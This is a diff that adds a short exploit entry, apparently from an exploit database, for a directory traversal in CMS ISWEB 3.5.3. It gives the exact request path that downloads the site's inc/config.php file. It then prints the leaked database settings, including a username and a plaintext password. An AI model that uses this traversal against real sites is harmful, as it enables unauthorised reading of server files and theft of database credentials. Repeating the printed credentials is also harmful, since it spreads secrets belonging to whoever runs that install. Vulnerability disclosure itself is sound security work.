@@ -1,0 +1,26 @@
+# Exploit Title: CMS ISWEB 3.5.3 - Directory Traversal
+# Date: 2018-08-01
+# Exploit Author: Thiago "thxsena" Sena
+# Vendor Homepage: http://www.isweb.it
+# Version: 3.5.3
+# Tested on: Linux
+# CVE : N/A
+
+# PoC:
+# CMS ISWEB 3.5.3 is vulnerable to directory traversal and local file download,
+# as demonstrated by
+
+moduli/downloadFile.php?file=oggetto_documenti/../.././inc/config.php
+
+# Download and open it.
+$dati_db = array(
+    'tipo' => 'mysql',
+    'host' => 'localhost',
+    'user' => 'networkis',
+    'password' => 'guybrush77',
+    'database' => 'networkis',
+    'database_offline' => '',
+    'persistenza' => FALSE,
+    'prefisso' => '',
+    'like' => 'LIKE'
+);
